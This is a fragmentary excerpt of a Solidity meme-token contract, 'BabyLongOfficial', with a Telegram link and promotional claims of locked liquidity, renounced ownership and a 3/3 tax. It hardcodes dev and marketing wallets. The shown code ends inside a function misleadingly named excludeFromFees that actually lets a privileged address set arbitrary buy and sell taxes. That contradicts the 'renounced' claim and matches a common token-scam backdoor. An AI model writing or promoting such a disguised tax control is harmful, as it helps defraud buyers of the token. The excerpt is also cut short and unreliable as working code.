...
Telegram : //https://t.me/BabyLongOfficial

Low Lp 0.1. locked for 1 year. renounced
LOW TAX 3/3
...
contract BabyLongOfficial is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "BabyLongOfficial";
    string private constant _symbol = unicode"$BLONG";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 420000000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x4749749B1FB42AE9a3F8992D5E8F417e6A43C15B);
    address payable public MarketingWallet = payable(0x61bBF1f046f8a960eA46D76675F8F13de0bab930);
    ...
    function excludeFromFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
